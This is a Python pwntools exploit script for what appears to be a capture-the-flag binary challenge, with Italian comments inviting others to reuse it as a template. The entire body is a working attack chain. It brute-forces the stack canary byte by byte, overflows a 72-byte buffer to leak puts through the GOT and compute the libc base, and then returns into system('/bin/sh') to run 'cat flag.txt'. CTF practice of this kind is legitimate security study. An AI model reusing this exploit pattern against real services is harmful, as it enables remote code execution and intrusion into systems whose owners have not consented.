#!/usr/bin/env python3
import os
import sys
import subprocess
from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux.so.2")
context.binary = exe

URL = ''
PORT = 0

def start(argv=[], *a, **kw):
    # template fatto da greyhat00 per chi viene dopo.
    # usalo liberamente per imparare e sperimentare.
    # buona fortuna, lettore. Happy pwn!
    if args.R2:
        io = process([exe.path] + argv, *a, **kw)
        # changeme sys.main
        # parametri di r2 personalizzabili
        # es:
        # r2_cmd = "r2 -c 'db sym.foo+122; dc; Vpp; px @ section..got' -d " + str(io.pid)
        r2_cmd = "r2 -c 'db sym.main; dc; Vpp' -d " + str(io.pid)
        
        subprocess.Popen(
            [
            "x-terminal-emulator",                  # open systen default terminal emulator
             "-e", 
             os.environ.get("SHELL", "/bin/sh"),    # execute default shell
             "-c", 
             r2_cmd],                               # with radare2 command
            stdout=subprocess.DEVNULL,
            stderr=subprocess.STDOUT
        )
        # pause the current python script until key pressed
        # manually added to avoid race condition waiting for r2 to start     
        ui.pause()
        return io

    if args.REMOTE:
        try:
            host = sys.argv[1]
            port_val = int(sys.argv[2])
        except (IndexError, ValueError):
            host = URL
            port_val = PORT

        if not host or not port_val:
            log.error(
                "REMOTE mode selected but HOST or PORT is missing or invalid.\n"
                "Usage example:\n"
                "  ./exploit.py REMOTE 8.8.8.8 9999\n"
                "Or set URL and PORT variables in the script."
            )
            exit(1)

        log.info("Connecting to remote"+ str(host) + str(port_val))
        return remote(host, port_val)

    else:
        log.info("Launching local process")
        return process([exe.path] + argv, *a, **kw)

line = b": "
bof = 72
canary = b'\x00'  

io = start()
# brutreforce the canary
for i in range(0, 4):
    for b in range(11, 256):
        token = bytes([b])
        sonda = cyclic(bof) + canary + token

        sys.stdout.write(f"\r[byte {i}] trying 0x{b:02x} — canary so far: {canary.hex()}")
        sys.stdout.flush()

        io.sendlineafter(line, sonda)
        io.recvuntil(b'flickers.\n')
        oracle = io.recvline()

        if b"stack" not in oracle:
            canary += token
            sys.stdout.write(f"\r[byte {i}] FOUND  0x{b:02x} — canary now: {canary.hex()}\n")
            sys.stdout.flush()
            found = True
            break

    else:
        sys.stdout.write(f"\r[byte {i}] NOT FOUND — controlla offset/prompt/behavior\n")
        sys.stdout.flush()
        exit(1)

success(f"canary -> {canary.hex()}")

payload = flat([
    cyclic(bof),        # buffer
    canary,             # canary trovato
    cyclic(11),
    exe.sym.puts,       # call function
    0,                  # return 
    exe.got.puts,       # first arg
    ]
)

io.sendlineafter(line, payload)
io.recvuntil(b'flickers.\n')
puts_leak = u32(io.recvline()[:4])
libc.address = puts_leak - libc.sym.puts 
binsh = next(libc.search(b"/bin/sh\x00"))

success(f"puts @ {hex(puts_leak)}")
success(f"libc @ {hex(libc.address)}")


payload = flat({
    bof: [
    canary,             # canary trovato
    cyclic(11),         # padding
    libc.sym.system,       # call function
    0,                     # return 
    binsh,                 # first arg
    ]}
)
io.sendlineafter(line, payload)
io.sendline(b"cat flag.txt")
data = io.recvregex(rb'v1t\{.*\}', capture=True)
flag = data.group(0).decode()
success('Flag: ' + flag)
write('flag.txt', flag)
io.close()
